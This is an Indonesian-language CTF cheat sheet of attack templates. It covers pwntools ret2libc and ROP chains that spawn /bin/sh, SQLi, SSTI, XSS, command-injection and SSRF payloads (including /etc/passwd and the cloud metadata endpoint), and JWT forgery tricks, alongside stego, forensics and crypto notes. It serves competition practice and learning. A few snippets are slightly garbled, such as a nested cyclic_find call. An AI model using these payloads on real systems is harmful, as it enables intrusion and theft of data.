# CTF Master Cheat Sheet — Mona

> Dibuat 2026-06-25, target CTF malam ini.
> Fokus: pola paling sering muncul, langsung gas.

---

## 1. PWN / BINARY EXPLOITATION

### checksec — cek proteksi binary
```bash
checksec --file=./binary
# Hasil: RELRO / Stack Canary / NX / PIE
```

| Proteksi | Arti | Bypass |
|----------|------|--------|
| **NX disabled** | Stack bisa execute | Inject shellcode langsung |
| **No PIE** | Address tetap | Bisa pake address absolut |
| **No canary** | Buffer overflow gak terdeteksi | Overflow RIP langsung |
| **Partial RELRO** | GOT writable | GOT overwrite |
| **Full RELRO** | GOT read-only | ret2libc / ROP |

### Find offset ke RIP
```python
from pwn import *
pattern = cyclic(200)
# Kirim pattern → crash → cek RIP
offset = cyclic_find(cyclic_find(0x6161616c))  # pake fault_addr atau manual
```

### ret2win (NX ON, ada fungsi win())
```python
elf = ELF('./binary')
payload = b'A' * offset + p64(elf.symbols['win'])
# PIE? butuh leak dulu: elf.address = leak - elf.symbols['main']
```

### ret2libc (NX ON, gak ada win())
```python
# Stage 1: leak puts@GOT → libc base
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')  # return ke main buat stage 2

# Stage 2: system("/bin/sh")
libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)
rop2.call('execve', [next(libc.search(b'/bin/sh\x00')), 0, 0])
```

### ROP gadgets penting
```python
pop_rdi = elf.search(asm('pop rdi; ret')).__next__()  # x86_64
ret = elf.search(asm('ret')).__next__()  # stack alignment buat movaps
pop_rsi_r15 = elf.search(asm('pop rsi; pop r15; ret')).__next__()
```

### Format string leak (PIE bypass)
```python
# Kirim %p.%p.%p... buat leak stack
# Cari address 0x55xxxxxxxx (PIE code) atau 0x7fxxxxxxxx (libc)
```

### One gadget RCE
```bash
one_gadget ./libc.so.6  # cari address langsung execve("/bin/sh")
```

### Pwntools shortcuts
```python
p = remote('host', port)  # remote target
p = process('./binary')   # local
p.sendline(b'data')
p.recvuntil(b':')
p.interactive()  # jadi shell
elf = ELF('./binary')
libc = ELF('./libc.so.6')
```

---

## 2. STEGANOGRAPHY

### Quick checklist — jalanin semua:
```bash
file suspect.file          # cek beneran formatnya?
exiftool suspect.file      # metadata — sering ada flag di Comment/Description
strings suspect.file       # cari flag langsung
binwalk suspect.file       # cek embedded file
```

### Image stego:
```bash
zsteg suspect.png          # LSB detection (PNG/BMP)
zsteg -a suspect.png       # all checks
steghide extract -sf suspect.jpg -p ""  # pake password kosong
stegseek suspect.jpg rockyou.txt        # brute force password
stegoveritas suspect.jpg                # comprehensive
```

### Audio stego:
```bash
# LSB analysis
# Spectrogram — cek pake Audacity atau sonic-visualiser
# Wave pattern — cek ada data di frekuensi tertentu
```

### Custom LSB extract:
```python
from PIL import Image
import numpy as np
img = Image.open('file.png')
pixels = np.array(img)
lsb = pixels[:,:,0] & 1  # Red channel LSB
# Cek distribusi: ~50% = natural, menyimpang = stego
```

### File carving:
```bash
foremost -t all -i image.dd -o output/
scalpel -c scalpel.conf -o output/ image.dd
# Recover deleted files dari disk image
```

---

## 3. FORENSICS

### PCAP analysis:
```bash
tshark -r capture.pcap -Y "http.request" 2>/dev/null  # HTTP requests
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name 2>/dev/null  # DNS queries
tshark -r capture.pcap -Y "http contains flag" 2>/dev/null  # filter flag
strings capture.pcap | grep -i "flag\|CTF\|{"   # strings langsung
```

### Memory dump (Volatility):
```bash
volatility -f memory.dump imageinfo
volatility -f memory.dump --profile=Win7SP1x64 pslist
volatility -f memory.dump --profile=Win7SP1x64 cmdline
volatility -f memory.dump --profile=Win7SP1x64 consoles  # cmd history
volatility -f memory.dump --profile=Win7SP1x64 filescan | grep flag
volatility -f memory.dump --profile=Win7SP1x64 dumpfiles -Q 0x... -D output/
volatility -f memory.dump --profile=Win7SP1x64 netscan
```

### Strings + grep:
```bash
strings file | grep -i "flag\|CTF\|HTB\|{\|secret\|password"
strings -n 10 file  # strings minimal 10 chars
```

---

## 4. CRYPTOGRAPHY

### XOR (paling sering di CTF):
```python
# Single-byte XOR
def single_byte_xor(data, key):
    return bytes([b ^ key for b in data])

# Brute force semua key
for k in range(256):
    result = single_byte_xor(ciphertext, k)
    if b'flag' in result.lower():
        print(k, result)

# Repeating-key XOR
def repeating_xor(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

# Crib dragging — kalo tau sebagian plaintext
# "flag{" = known plaintext → XOR dapet key segment
```

### RSA — common attacks:
```python
# 1. Small e (e=3, m^3 < n)
#   → cube root (integer)
#   → m = iroot(c, 3)

# 2. Wiener (large d, small d)
#   → d dekat phi(n), pake continued fraction

# 3. Common modulus (same n, two e)
#   → extended gcd → recover m

# 4. Fermat (p,q dekat)
#   → p ≈ q → start from sqrt(n), cari adjacent primes

# 5. Low exponent broadcast (same m, different n)
#   → Chinese Remainder Theorem + iroot

# 6. Known p, q, e (dasar)
from Crypto.Util.number import inverse, long_to_bytes
d = inverse(e, (p-1)*(q-1))
m = pow(c, d, n)
print(long_to_bytes(m))
```

### Hash length extension (MD5, SHA1, SHA256):
```python
# Kalo tau: hash(secret + message), len(secret), message
# Bisa bikin: hash(secret + message + padding + append) TANPA tau secret
# Tools: hash_extender, hlextend
```

### AES:
```python
# ECB — byte-at-a-time decryption
#   → kirim padding 1..15 byte, detect block boundary
#   → recover byte per byte

# CBC — bit flipping
#   → XOR previous ciphertext byte utk ubah decrypted plaintext

# Padding oracle
#   → Server kasih tau padding valid/tidak → recover plaintext byte per byte
```

### Classic ciphers:
```python
# Caesar — shift 1-25, cek mana yg readable
# Vigenere — Kasiski examination or Index of Coincidence cari key length
# Base64 — decode langsung
# Morse, Bacon, Atbash — online decoder
```

---

## 5. REVERSE ENGINEERING

### Ghidra workflow (tanpa Ghidra GUI):
```bash
# Cek binary dulu
file binary
strings binary
objdump -d binary | head -100
```

### String-based RE:
```bash
strings binary | grep -i "flag\|password\|key\|secret"
strings -n 10 binary | sort -u
# Kalo binary stripped: cari reference ke string address di assembly
```

### Anti-debug / packed:
```bash
# UPX packed?
upx -d binary  # unpack
file binary    # cek abis unpack

# Obfuscated?
# Cari XOR loops, anti-debug (ptrace, IsDebuggerPresent)
# Cek ada gak section aneh (.packed, .themida, .vmp)
```

### Android RE (APK):
```bash
apktool d app.apk
# Cek AndroidManifest.xml, classes.dex
# pake jadx atau d2j-dex2jar buat decompile
```

---

## 6. WEB EXPLOITATION

### Injection pattern:
```bash
# SQLi: ' OR 1=1--, ' UNION SELECT 1,2,3--
# NoSQL: ' || '1'=='1, $ne, $gt
# SSTI: {{7*7}}, #{7*7}, ${7*7}
# XSS: <script>alert(1)</script>, <img src=x onerror=alert(1)>
# Command injection: ;id, |id, $(id), `id`
```

### SSRF:
```bash
# Coba: file:///etc/passwd, http://localhost:8080, http://127.0.0.1:22
# Cloud metadata: http://169.254.169.254/latest/meta-data/
```

### JWT:
```python
# 1. Algorithm none — hapus algo, set "alg":"none"
# 2. Algorithm confusion — RS256 → HS256 pake public key sebagai secret
# 3. Weak secret — crack pake hashcat (jwt mode 16500)
```

---

## 7. QUICK TOOL INSTALL

```bash
pip install pwntools ROPgadget  # PWN
pip install zsteg stegoveritas   # Stego
pip install pillow numpy          # Image analysis
apt install foremost scalpel steghide exiftool binwalk  # Forensics
apt install tshark                # PCAP analysis
```

---

## POLA PIKIR CTF
1. **Ada input?** → overflow / injection / traversal
2. **Ada binary?** → strings / checksec / decompile
3. **Ada file?** → file / strings / binwalk / exiftool
4. **Ada network?** → PCAP / port scan / HTTP analysis
5. **Ada hash/cipher?** → identify type → crack / decode
6. **Gak tau approach?** → cari write-up dulu, jangan brute force

**Yang paling penting:** `strings` + `grep "flag"` duluan sebelum approach rumit.
Seringkali flag tinggal di strings output.